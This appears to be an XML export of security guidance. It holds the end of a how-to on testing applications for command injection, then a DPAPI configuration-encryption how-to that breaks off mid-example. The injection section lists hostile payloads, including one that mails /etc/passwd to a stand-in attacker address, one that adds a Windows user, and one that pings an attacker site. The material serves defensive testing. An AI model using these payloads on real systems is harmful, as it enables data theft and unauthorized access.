&lt;p&gt;First, you need to find all the places where your application invokes a system command to perform and operation.&amp;nbsp; Then on each of these places, start exploring how the application handles the basic characters needed for command injection.&amp;nbsp;&amp;nbsp;&amp;nbsp; The following
 two strings are good to try as they contain both commands and command injection characters:
&lt;/p&gt;
&lt;pre&gt;abc;dir C:|xyz&amp;amp;netstat&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (Windows)&lt;/pre&gt;
&lt;pre&gt;abc;ls|cp&amp;amp;rm&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (UNIX)&lt;/pre&gt;
&lt;p&gt;If the application doesn’t give an error message because of the special characters then there is a chance that it suffers from a command injection bug.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Build a valid command&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;It is important that you are able to comprehend.&amp;nbsp; For example, a &lt;em&gt;file not found&lt;/em&gt; error rather than an
&lt;em&gt;invalid data format&lt;/em&gt; error is a good hint that the application is processing the special characters as part of the file.&amp;nbsp; For example, you might get a file not found error when using the following string:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;file.txt|dir c:&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;This is because the application is calling exec() with the following string:&lt;/p&gt;
&lt;pre&gt;cmd /c type &amp;quot;c:\public_html\user_files\&lt;strong&gt;file.txt|dir c:&lt;/strong&gt;&amp;quot; &lt;/pre&gt;
&lt;p&gt;For the input string to execute the directory listing command you need to close the double quotes before appending the extra command:&lt;/p&gt;
&lt;pre&gt;file.txt&lt;strong&gt;&amp;quot;&lt;/strong&gt;|dir c:&lt;/pre&gt;
&lt;p&gt;Pay extra attention to quotes and double quotes since omitting them can easily result in the injection string treated as data.
&lt;/p&gt;
&lt;p&gt;Sometimes the application doesn’t reflect the output of the injected command on screen. To get around this, use a command that doesn’t create screen output but that performs a visible action:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;file.txt;mail attacker@attacker.org &amp;lt;/etc/passwd&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;pre&gt;Emails attacker the server’s passwords.&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;file.txt|net user /add &amp;quot;hacker&amp;quot;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;pre&gt;Adds hacker to the Windows user database.&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;file.txt;ping%20attacker_site&lt;/pre&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;pre&gt;Pings the attacker site.&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&lt;/pre&gt;
&lt;h1&gt;Step 4:&amp;nbsp; Fine-tune Test Case Data&lt;/h1&gt;
&lt;p&gt;To thoroughly test your application against command injection bugs, you must cover all possible entry points and scenarios where command injection is possible.&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Try different entry points and scenarios&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Continue exploring the different entry points of the application.&amp;nbsp; The format of the test case data will vary depending on the entry point.&amp;nbsp; For example if you are testing through the URL the string file.txt&amp;quot;|dir c: might look like one of the two below (depending
 on the URL encoding):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;pre&gt;file.txt&amp;quot;|dir%20c: &lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;pre&gt;file.txt&amp;quot;|dir&amp;#43;c:&amp;nbsp;&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;It is important that you consider different encodings and data format for additional command injection entry points such as: input fields, URL parameters, POST data, web service methods, user interface elements, environment variables, database contents,
 registry contents, file contents, third party APIs, and network packets.&lt;/p&gt;
&lt;p&gt;When testing for indirect command injection it is important that you control the source of the parameters passed to the target function. &amp;nbsp;&amp;nbsp;For example, if you are attacking an application using execfile as the target functionthen you must control the file
 passed to this function.&amp;nbsp; Let’s say the application uses execfile /private/commands.txt. Here you don’t need to pass any malicious parameters; you must modify the commands file to inject malicious commands and wait for (or force) the injected command to execute.
 It is recommended that, when testing for indirect injection, you use an environment monitoring tool.&amp;nbsp;&amp;nbsp; You can use Sysinternals
&lt;em&gt;Process Explorer&lt;/em&gt; that now combines registry, file system, and environment variable monitoring to find out the external sources your application uses when invoking shell or system commands.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Command injection bugs exist because of poor input validation and sanitization on the parameters used by functions that interact with the operating system shell.&amp;nbsp;&amp;nbsp; Any attacker with control of these parameters can force the application to execute unwanted
 system commands.&amp;nbsp; Testing against command injection bugs consists of manipulating the original command parameters with different combinations of command injection strings that vary depending on the action to perform and the entry point under test.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;
&amp;nbsp;&lt;/p&gt;
&lt;br&gt;
&lt;hr&gt;
&lt;br&gt;
&lt;p&gt;[i] &lt;strong&gt;Command Injection&lt;/strong&gt;. OWASP. &lt;a href="http://www.owasp.org/index.php/Command_Injection"&gt;
http://www.owasp.org/index.php/Command_Injection&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>8617d36b-a715-4a8b-91c2-eb8064e9df15</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Encrypt Configuration Sections in ASP.NET Using DPAPI</title>
    <topic>Security</topic>
    <technology>ASP.NET</technology>
    <category>Configuration</category>
    <phase>Implementation</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Summary&amp;nbsp;&lt;/h1&gt;
&lt;p&gt;This How to shows how to use the Windows Data Protection application programming interface (DPAPI) protected configuration provider and the Aspnet_regiis.exe tool to encrypt sections of your configuration files. You can use the Aspnet_regiis.exe tool to
 encrypt sensitive data, such as connection strings, held in the Web.config and Machine.config files. The DPAPI protected configuration provider supports machine-level and user-level stores for key storage. The choice of store depends largely on whether or
 not your application shares a server with other applications and whether or not sensitive data must be kept private for each application. Note that if your application is deployed in a Web farm, you should use the RSA protected configuration provider due to
 the ease with which RSA keys can be exported.&lt;/p&gt;
&lt;h1&gt;Contents&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Objectives &lt;/li&gt;&lt;li&gt;Overview &lt;/li&gt;&lt;li&gt;Summary of Steps &lt;/li&gt;&lt;li&gt;Step 1. Identify the Configuration Sections to be Encrypted &lt;/li&gt;&lt;li&gt;Step 2. Choose the Machine or User Store &lt;/li&gt;&lt;li&gt;Step 3. Encrypt Your Configuration File Data &lt;/li&gt;&lt;li&gt;Web Farm Scenarios &lt;/li&gt;&lt;li&gt;Additional Resources&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Objectives&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Know which sections can and cannot be encrypted with the DPAPI protected configuration provider.
&lt;/li&gt;&lt;li&gt;Choose between user-level and machine-level DPAPI key storage. &lt;/li&gt;&lt;li&gt;Use the DPAPI protected configuration provider to encrypt sections of your configuration file.
&lt;/li&gt;&lt;li&gt;Learn about the Web farm restrictions. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Overview&lt;/h1&gt;
&lt;p&gt;Configuration files such as the Web.config file are often used to hold sensitive information, including user names, passwords, database connection strings, and encryption keys. If you do not protect this information, your application is vulnerable to attackers
 or malicious users obtaining sensitive information such as account user names and passwords, database names and server names. The sections that usually contain sensitive information that you need to encrypt are the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lt;appSettings&amp;gt;. This section contains custom application settings. &lt;/li&gt;&lt;li&gt;&amp;lt;connectionStrings&amp;gt;. This section contains connection strings. &lt;/li&gt;&lt;li&gt;&amp;lt;identity&amp;gt;. This section can contain impersonation credentials. &lt;/li&gt;&lt;li&gt;&amp;lt;sessionState&amp;gt;. The section contains the connection string for the out-of-process session state provider.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of your configuration file that store sensitive data.&lt;/p&gt;
&lt;h1&gt;Summary of Steps&lt;/h1&gt;
&lt;p&gt;To encrypt configuration sections by using the DPAPI data protection provider, perform the following steps:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1. Identify the configuration sections to be encrypted. &lt;/li&gt;&lt;li&gt;Step 2. Choose the machine or user store. &lt;/li&gt;&lt;li&gt;Step 3. Encrypt your configuration file data. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Step 1. Identify the Configuration Sections to Be Encrypted&lt;/h1&gt;
&lt;p&gt;Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of your configuration file that store sensitive data.&lt;/p&gt;
&lt;h2&gt;Sections You Cannot Encrypt Using Protected Configuration&lt;/h2&gt;
&lt;p&gt;If you store sensitive data in any of the following configuration sections, you cannot encrypt it by using protected configuration and the Aspnet_regiis.exe tool:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lt;&lt;strong&gt;processModel&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;runtime&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;mscorlib&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;startup&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;system.runtime.remoting&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;configProtectedData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;satelliteassemblies&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;cryptographySettings&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;cryptoNameMapping&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;cryptoClasses&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For the configuration sections listed, you should use the Aspnet_setreg.exe tool, which is also available for previous versions of the .NET Framework.
&lt;/p&gt;
&lt;p&gt;For more information about using the Aspnet_setreg tool to encrypt data in these configuration sections, see Microsoft Knowledge Base article 329290, How to use the ASP.NET utility to encrypt credentials and session state connection strings.&lt;/p&gt;
&lt;h1&gt;Step 2. Choose the Machine or User Store&lt;/h1&gt;
&lt;p&gt;The &lt;strong&gt;DataProtectionConfigurationProvider&lt;/strong&gt; supports machine-level and user-level stores for key storage. The choice of store depends largely on whether or not your application shares a server with other applications and whether or not sensitive
 data must be kept private for each application.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;For information on where the user key is stored, see:
&lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnsecure/html/windataprotection-dpapi.asp"&gt;
Windows Data Protection&lt;/a&gt;.&lt;/blockquote&gt;
&lt;h2&gt;Machine Store&lt;/h2&gt;
&lt;p&gt;Use machine-level key storage in the following situations: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Your application runs on its own dedicated server with no other applications.
&lt;/li&gt;&lt;li&gt;You have multiple applications on the same server that run and you want those applications to be able to share sensitive information.
&lt;/li&gt;&lt;/ul&gt;
&lt;h2&gt;User Store&lt;/h2&gt;
&lt;p&gt;Use user-level key storage if you run your application in a shared hosting environment and you want to make sure that your application's sensitive data is not accessible to other applications on the server. In this situation, each application should run
 under a separate identity, and the resources for the application—such as files and databases—should be restricted to that identity.&lt;/p&gt;
&lt;h1&gt;Step 3. Encrypt Your Configuration File Data&lt;/h1&gt;
&lt;p&gt;This step shows you how to encrypt a connection string in the Web.config file, first with the machine store and then with the user store.&lt;/p&gt;
&lt;h2&gt;Using DPAPI with the Machine Store to Encrypt a Connection String in Web.config&lt;/h2&gt;
&lt;p&gt;By default, the &lt;strong&gt;DataProtectionConfigurationProvider&lt;/strong&gt; is configured to use DPAPI with the machine store.
&lt;/p&gt;
&lt;h3&gt;To encrypt the connectionStrings section in Web.config &lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Create a new Web site named MachineDPAPI. Make sure that this directory is configured as a virtual directory.
&lt;/li&gt;&lt;li&gt;Add a Web.config configuration file to this directory. &lt;/li&gt;&lt;li&gt;Add a sample &lt;strong&gt;connectionString&lt;/strong&gt; similar to the following example.
&lt;div&gt;
&lt;pre&gt;&amp;lt;connectionStrings&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;add name=&amp;quot;MyLocalSQLServer&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connectionString=&amp;quot;Initial Catalog=aspnetdb;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; data source=localhost;Integrated Security=SSPI;&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; providerName=&amp;quot;System.Data.SqlClient&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/connectionStrings&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;To encrypt the &lt;strong&gt;connectionStrings&lt;/strong&gt; section, run the following command from a .NET command prompt:
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/MachineDPAPI&amp;quot; -prov &amp;quot;DataProtectionConfigurationProvider&amp;quot;&lt;/strong&gt;
&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;The above command with the &lt;strong&gt;-app&lt;/strong&gt; switch assumes that there is an IIS virtual directory called MachineDPAPI. If you are using the Visual Studio Web server instead of IIS, use the
&lt;strong&gt;-pef&lt;/strong&gt; switch, which allows you to specify the physical directory location of your configuration file.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;aspnet_regiis.exe -pef &amp;quot;connectionStrings&amp;quot; C:\Projects\MachineDPAPI -prov &amp;quot;DataProtectionConfigurationProvider&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;The Aspnet_regiis.exe utility tool is located in the following directory:&lt;/blockquote&gt;
&lt;blockquote&gt;%WinDir%\Microsoft.NET\Framework\&amp;lt;&lt;em&gt;versionNumber&lt;/em&gt;&amp;gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;strong&gt;-pe&lt;/strong&gt; switch specifies the configuration section to encrypt.
&lt;/li&gt;&lt;li&gt;The &lt;strong&gt;-pef&lt;/strong&gt; switch specifies the configuration section to encrypt and allows you to supply the physical directory path for your configuration file.
&lt;/li&gt;&lt;li&gt;The &lt;strong&gt;-app&lt;/strong&gt; switch specifies your Web application's virtual path. If it is a nested application, you need to specify the nested path from the root directory; for example,
&lt;strong&gt;&amp;quot;/test/aspnet/MachineDPAPI&amp;quot;&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;The &lt;strong&gt;-prov&lt;/strong&gt; switch specifies the provider name.
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Encrypting configuration section...Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;The DPAPI machine key is stored at the following location:&lt;/blockquote&gt;
&lt;blockquote&gt;%windir%\system32\Microsoft\Protect\S-1-5-18&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Review the Web.config file, and examine the changes. The following elements are created:
&lt;ul&gt;
&lt;li&gt;&amp;lt;&lt;strong&gt;EncryptedData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;CipherData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;CipherValue&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Your modified Web.config file, with the &lt;strong&gt;connectionStrings&lt;/strong&gt; section encrypted, should be similar to the following example.
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;...&lt;br&gt;&amp;lt;connectionStrings configProtectionProvider=&amp;quot;DataProtectionConfigurationProvider&amp;quot;&amp;gt; &lt;br&gt;&amp;nbsp; &amp;lt;EncryptedData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherData&amp;gt;&lt;br&gt;&amp;lt;CipherValue&amp;gt;AQAAANCMnd8BFdERjHoAwE/Cl&amp;#43;sBAAAAexuIJ/8oFE&amp;#43;sGTs7jBKZdgQAAAACAAAAAAADZgAAqAAAA&lt;br&gt;BAAAAA&lt;br&gt;Kms84dyaCPAeaSC1dIMIBAAAAAASAAACgAAAAEAAAAKaVI6aAOFdqhdc6w1Er3HMwAAAAcZ00MZOz1dI7kYRvkMIn/&lt;br&gt;BmfrvoHNUwz6H9rcxJ6Ow41E3hwHLbh79IUWiiNp0VqFAAAAF2sXCdb3fcKkgnagkHkILqteTXh&amp;lt;/CipherValue&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/CipherData&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/EncryptedData&amp;gt;&lt;br&gt;&amp;lt;/connectionStrings&amp;gt;&lt;br&gt;...&lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Add the following Default.aspx Web page to your application's virtual directory, and then browse to this page to verify that encryption and decryption worked correctly.
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;br&gt;&lt;br&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; protected void Page_Load(object sender, EventArgs e)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Clear text connection string is: &amp;quot; &amp;#43; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ConfigurationManager.ConnectionStrings&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; [&amp;quot;MyLocalSQLServer&amp;quot;].ConnectionString);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body/&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;MyLocalSQLServer is the name of the connection string that you previously specified in the Web.config file.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;To change the &lt;strong&gt;connectionStrings&lt;/strong&gt; section back to clear text, run the following command from the command prompt:
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pd &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/MachineDPAPI&amp;quot;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Decrypting configuration section...&lt;br&gt;Succeeded!&lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;To decrypt the &lt;strong&gt;connectionStrings&lt;/strong&gt; section specifying a physical path to your application's configuration file, use the
&lt;strong&gt;-pdf&lt;/strong&gt; switch as shown here.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;aspnet_regiis -pdf &amp;quot;connectionStrings&amp;quot; C:\Projects\MachineDPAPI&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Using DPAPI with a User Store to Encrypt a Connection String in Web.Config&lt;/h2&gt;
&lt;p&gt;By default, the ASP.NET applications run under the NT AUTHORITY\Network Service account. When you access encrypted configuration sections using DPAPI with the user store, make sure that your application is running with the same user identity as the account
 you used to encrypt the data.&lt;/p&gt;
&lt;p&gt;Using the &lt;strong&gt;DataProtectionConfigurationProvider&lt;/strong&gt; and DPAPI with the user store requires a small amount of additional configuration in the Web.config file.&lt;/p&gt;
&lt;h3&gt;To encrypt the connectionStrings section in Web.config &lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Create a new Web site named UserDPAPI. Make sure that this directory is configured as a virtual directory.
&lt;/li&gt;&lt;li&gt;Add a Web.config configuration file to this directory. &lt;/li&gt;&lt;li&gt;Add a sample &lt;strong&gt;connectionString&lt;/strong&gt; similar to the following example.
&lt;div&gt;
&lt;pre&gt;&amp;lt;connectionStrings&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;add name=&amp;quot;MyLocalSQLServer&amp;quot; connectionString=&amp;quot;Initial Catalog=aspnetdb;&lt;br&gt;data source=localhost;Integrated Security=SSPI;&amp;quot; providerName=&amp;quot;System.Data.SqlClient&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/connectionStrings&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Add and configure a protected configuration provider to use the user store. To do this, add the following &amp;lt;&lt;strong&gt;configProtectedData&lt;/strong&gt;&amp;gt; section. You must set
&lt;strong&gt;useMachineProtection&lt;/strong&gt;=&lt;strong&gt; &amp;quot;false&amp;quot;&lt;/strong&gt; to instruct the provider to use the user store. You must also use a unique provider name, or a run-time error will occur.
&lt;div&gt;
&lt;pre&gt;&amp;lt;configProtectedData&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;providers&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;add useMachineProtection=&amp;quot;false&amp;quot; keyEntropy=&amp;quot;&amp;quot; name=&amp;quot;MyUserDataProtectionConfigurationProvider&amp;quot; &lt;br&gt;type=&amp;quot;System.Configuration.DpapiProtectedConfigurationProvider, System.Configuration,&lt;br&gt;     Version=3.5.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/providers&amp;gt;&lt;br&gt;&amp;lt;/configProtectedData&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Run the following command from a command prompt to encrypt the &lt;strong&gt;connectionStrings&lt;/strong&gt; section:
&lt;p&gt;&lt;strong&gt;Aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/UserDPAPI&amp;quot; -prov &amp;quot;MyUserDataProtectionConfigurationProvider&amp;quot;&lt;/strong&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The -&lt;strong&gt;pe&lt;/strong&gt; switch specifies the configuration section to encrypt.
&lt;/li&gt;&lt;li&gt;The -&lt;strong&gt;app&lt;/strong&gt; switch specifies your Web application's virtual path. If it is a nested application, you need to specify the nested path from the root directory; for example:
&lt;strong&gt;&amp;quot;/test/aspnet/UserDPAPI&amp;quot;&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;The -&lt;strong&gt;prov&lt;/strong&gt; switch specifies the provider name. In this case, this is set to
&lt;strong&gt;&amp;quot;MyUserDataProtectionConfigurationProvider&amp;quot;&lt;/strong&gt; which is the name you specified when configuring the provider in the step 3.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;If the command is successful, you will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Encrypting configuration section...Succeeded!&lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;For information on where the user key is stored, see:
&lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnsecure/html/windataprotection-dpapi.asp"&gt;
http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnsecure/html/windataprotection-dpapi.asp&lt;/a&gt;&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Because your application must access the data by using the same identity that you used to encrypt the data, you may need to run the encryption command using your application's service account identity. To do so, you can start a command window by using the
&lt;strong&gt;runas&lt;/strong&gt; command, specifying an appropriate domain and user name, as follows:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Runas /profile /user:domain\user cmd&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When you run Aspnet_regiis from the resulting command window, it will use the specified identity to perform the encryption. This enables your application that uses the same identity to decrypt the data at run time.
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Review the Web.config file, and examine the changes. The following elements are created:
&lt;ul&gt;
&lt;li&gt;&amp;lt;&lt;strong&gt;EncryptedData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;CipherData&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;li&gt;&amp;lt;&lt;strong&gt;CipherValue&lt;/strong&gt;&amp;gt; &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Your modified Web.config file, with the &lt;strong&gt;connectionStrings&lt;/strong&gt; section encrypted should be similar to the following example.
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;...&lt;br&gt;&amp;lt;connectionStrings configProtectionProvider=&amp;quot;MyUserDataProtectionConfigurationProvider&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;EncryptedData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;CipherData&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 